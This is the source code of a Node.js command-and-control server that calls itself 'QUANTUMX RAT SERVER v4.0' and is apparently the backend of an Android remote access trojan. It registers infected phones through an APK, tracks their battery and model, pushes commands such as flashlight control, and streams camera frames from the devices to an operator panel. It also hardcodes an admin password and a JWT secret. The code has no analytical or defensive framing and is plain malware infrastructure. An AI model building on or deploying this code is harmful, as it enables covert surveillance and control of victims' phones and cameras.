const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== DATABASE ==========
let users = [
    {
        id: 1,
        username: 'admin',
        password: 'quantumx',
        role: 'admin'
    }
];

let devices = new Map();
let commands = new Map();
let commandResults = new Map();
let cameraSessions = new Map(); // Untuk tracking camera preview

// ========== AUTH ==========
const JWT_SECRET = 'quantumx-super-secret-key-2024';

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) return res.status(401).json({ error: 'No token provided' });
    
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
}

// ========== API ROUTES ==========

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users.find(u => u.username === username);
    
    if (user && password === 'quantumx') {
        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        console.log(`✅ [LOGIN] ${username} - SUCCESS`);
        res.json({ success: true, token, user });
    } else {
        console.log(`❌ [LOGIN] ${username} - FAILED`);
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

// Verify token
app.post('/api/verify', authenticateToken, (req, res) => {
    res.json({ success: true, user: req.user });
});

// Device register
app.post('/api/device/register', (req, res) => {
    const { deviceId, deviceName, androidVersion, manufacturer, model, batteryLevel } = req.body;
    
    const deviceInfo = {
        deviceId,
        deviceName: deviceName || 'Unknown Device',
        androidVersion: androidVersion || 'Unknown',
        manufacturer: manufacturer || 'Unknown',
        model: model || 'Unknown',
        batteryLevel: batteryLevel || 0,
        lastSeen: new Date().toISOString(),
        online: true,
        ipAddress: req.ip || req.connection.remoteAddress,
        registeredAt: new Date().toISOString()
    };
    
    devices.set(deviceId, deviceInfo);
    
    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
    
    res.json({ success: true, deviceId, message: 'Device registered' });
});

// Get all devices
app.get('/api/devices', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        device.online = diffMinutes < 2;
    });
    
    res.json(deviceList);
});

// Get single device
app.get('/api/device/:deviceId', authenticateToken, (req, res) => {
    const device = devices.get(req.params.deviceId);
    if (!device) return res.status(404).json({ error: 'Device not found' });
    res.json(device);
});

// ========== COMMAND API ==========

// Send command to device
app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, params } = req.body;
    
    const commandId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    
    if (!commands.has(deviceId)) commands.set(deviceId, []);
    
    const commandData = {
        commandId,
        command,
        params: params || {},
        status: 'pending',
        createdAt: new Date().toISOString(),
        createdBy: req.user.username
    };
    
    commands.get(deviceId).push(commandData);
    
    // Emit ke device
    io.to(deviceId).emit('command', commandData);
    
    const deviceName = devices.get(deviceId)?.deviceName || deviceId;
    
    // LOG BERDASARKAN JENIS COMMAND
    if (command === 'flash') {
        console.log(`⚡ [FLASH] -> ${deviceName} (${deviceId}) | DURATION: ${params.duration}s`);
    } else if (command === 'camera_start') {
        console.log(`📸 [CAMERA] START -> ${deviceName} (${deviceId}) | INTERVAL: ${params.interval}ms`);
        cameraSessions.set(deviceId, { active: true, interval: params.interval });
    } else if (command === 'camera_stop') {
        console.log(`📸 [CAMERA] STOP -> ${deviceName} (${deviceId})`);
        cameraSessions.delete(deviceId);
    } else if (command === 'camera_frame') {
        console.log(`📸 [CAMERA] FRAME REQ -> ${deviceName} (${deviceId})`);
    } else {
        console.log(`📤 [COMMAND] ${command.toUpperCase()} -> ${deviceName} (${deviceId})`);
    }
    
    res.json({ success: true, commandId, message: 'Command sent' });
});

// Command result
app.post('/api/device/command/result', (req, res) => {
    const { commandId, deviceId, status, result } = req.body;
    
    const deviceCommands = commands.get(deviceId) || [];
    const commandIndex = deviceCommands.findIndex(cmd => cmd.commandId === commandId);
    
    if (commandIndex !== -1) {
        deviceCommands[commandIndex].status = status || 'completed';
        deviceCommands[commandIndex].result = result;
        deviceCommands[commandIndex].completedAt = new Date().toISOString();
        commands.set(deviceId, deviceCommands);
        
        commandResults.set(commandId, {
            deviceId,
            command: deviceCommands[commandIndex].command,
            status,
            result,
            completedAt: new Date().toISOString()
        });
        
        io.emit('command-result', { commandId, deviceId, status, result });
        
        const deviceName = devices.get(deviceId)?.deviceName || deviceId;
        if (status === 'completed') {
            if (deviceCommands[commandIndex].command === 'flash') {
                console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
            } else {
                console.log(`✅ [SUCCESS] ${deviceCommands[commandIndex].command.toUpperCase()} -> ${deviceName}`);
            }
        } else {
            console.log(`❌ [FAILED] ${deviceCommands[commandIndex].command.toUpperCase()} -> ${deviceName}`);
        }
    }
    
    res.json({ success: true });
});

// Get command result
app.get('/api/command/:commandId/result', authenticateToken, (req, res) => {
    const result = commandResults.get(req.params.commandId);
    if (!result) return res.status(404).json({ error: 'Command result not found' });
    res.json(result);
});

// Get pending commands
app.get('/api/device/:deviceId/commands/pending', (req, res) => {
    const deviceId = req.params.deviceId;
    const deviceCommands = commands.get(deviceId) || [];
    const pending = deviceCommands.filter(cmd => cmd.status === 'pending');
    res.json(pending);
});

// ========== WEBSOCKET ==========

io.on('connection', (socket) => {
    console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
    
    // ===== DEVICE CONNECT (DARI APK) =====
    socket.on('device-connect', (data) => {
        const { 
            deviceId, 
            deviceName, 
            androidVersion, 
            manufacturer, 
            model, 
            batteryLevel 
        } = data;
        
        socket.deviceId = deviceId;
        socket.join(deviceId);
        
        // Update atau simpan device dengan DATA LENGKAP
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.online = true;
            device.lastSeen = new Date().toISOString();
            device.deviceName = deviceName || device.deviceName;
            device.androidVersion = androidVersion || device.androidVersion;
            device.manufacturer = manufacturer || device.manufacturer;
            device.model = model || device.model;
            device.batteryLevel = batteryLevel || device.batteryLevel;
            devices.set(deviceId, device);
        } else {
            devices.set(deviceId, {
                deviceId,
                deviceName: deviceName || 'Unknown Device',
                androidVersion: androidVersion || 'Unknown',
                manufacturer: manufacturer || 'Unknown',
                model: model || 'Unknown',
                batteryLevel: batteryLevel || 0,
                lastSeen: new Date().toISOString(),
                online: true,
                registeredAt: new Date().toISOString()
            });
        }
        
        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
        
        // KIRIM DATA LENGKAP KE PANEL!
        io.emit('device-status', {
            deviceId,
            deviceName,
            androidVersion,
            manufacturer,
            model,
            batteryLevel,
            status: 'online',
            timestamp: new Date().toISOString()
        });
    });
    
    // ===== HEARTBEAT DARI APK =====
    socket.on('heartbeat', (data) => {
        const { deviceId, batteryLevel, deviceName, androidVersion } = data;
        
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = new Date().toISOString();
            device.online = true;
            device.batteryLevel = batteryLevel || device.batteryLevel;
            device.deviceName = deviceName || device.deviceName;
            device.androidVersion = androidVersion || device.androidVersion;
            devices.set(deviceId, device);
        }
        
        // KIRIM HEARTBEAT KE PANEL (UPDATE DATA)
        io.emit('heartbeat', {
            deviceId,
            batteryLevel,
            deviceName,
            androidVersion,
            timestamp: new Date().toISOString()
        });
        
        console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
    });
    
    // ===== CAMERA FRAME DARI APK =====
    socket.on('camera-frame', (data) => {
        const { deviceId, imageData } = data;
        
        // Kirim ke semua panel yang subscribe
        io.emit('camera-frame', {
            deviceId,
            imageData,
            timestamp: new Date().toISOString()
        });
        
        console.log(`📸 [CAMERA] FRAME from ${deviceId} (${imageData.length} bytes)`);
    });
    
    // ===== PANEL CONNECT =====
    socket.on('panel-connect', () => {
        socket.isPanel = true;
        console.log(`🖥️ [PANEL] CONNECTED: ${socket.id}`);
    });
    
    // ===== DISCONNECT =====
    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const deviceId = socket.deviceId;
            
            if (devices.has(deviceId)) {
                const device = devices.get(deviceId);
                device.online = false;
                devices.set(deviceId, device);
                
                // Hapus camera session jika ada
                if (cameraSessions.has(deviceId)) {
                    cameraSessions.delete(deviceId);
                }
            }
            
            const deviceName = devices.get(deviceId)?.deviceName || deviceId;
            console.log(`📱 [DEVICE] OFFLINE: ${deviceName} (${deviceId})`);
            
            io.emit('device-status', {
                deviceId,
                status: 'offline',
                timestamp: new Date().toISOString()
            });
        } else {
            console.log(`🔌 [SOCKET] DISCONNECTED: ${socket.id}`);
        }
    });
});

// ========== STATS API ==========
app.get('/api/stats', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    let onlineCount = 0;
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        if (diffMinutes < 2) onlineCount++;
    });
    
    res.json({
        totalDevices: devices.size,
        onlineDevices: onlineCount,
        totalCommands: commandResults.size,
        pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
        activeCameraSessions: cameraSessions.size
    });
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════╗
║    QUANTUMX RAT SERVER v4.0           ║
║    RUNNING ON PORT: ${PORT}                      ║
║    WEBSOCKET: ws://localhost:${PORT}             ║
║    API: http://localhost:${PORT}/api            ║
║    FEATURES: FLASH + CAMERA PREVIEW    ║
╚═══════════════════════════════════════╝
    `);
});
